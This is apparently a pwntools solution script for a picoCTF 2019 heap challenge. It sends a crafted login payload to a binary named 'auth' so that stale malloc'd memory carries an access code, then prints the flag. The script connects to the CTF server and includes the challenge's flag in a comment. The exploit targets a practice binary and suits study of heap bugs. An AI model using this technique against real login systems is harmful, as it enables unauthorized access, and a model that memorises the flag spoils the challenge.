from pwn import *
import sys

# picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8aa9bc45}
argv = sys.argv

DEBUG = False
BINARY = './auth'

context.binary = BINARY
# context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)
  # pass



if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()
    # pass

  REMOTE = False
else:
  sh = remote('2019shell1.picoctf.com', 49920)
  REMOTE = True

code = ''
code += unhex('4343415f544f4f52')[::-1]
code += unhex('45444f435f535345')[::-1]
print code

sh.sendlineafter('> ', 'login')
sh.sendlineafter('username\n', '32')


payload = ''
payload += p64(0x0000000000602000) # username ptr
payload += code
payload += p64(0xdeadbeefdeadbeef) # files ptr

sh.sendlineafter('username\n', payload)
sh.sendlineafter('> ', 'logout')


sh.sendlineafter('> ', 'login')
sh.sendlineafter('username\n', '16')
sh.sendlineafter('username\n', 'bbb')

sh.sendlineafter('> ', 'print-flag')

sh.interactive()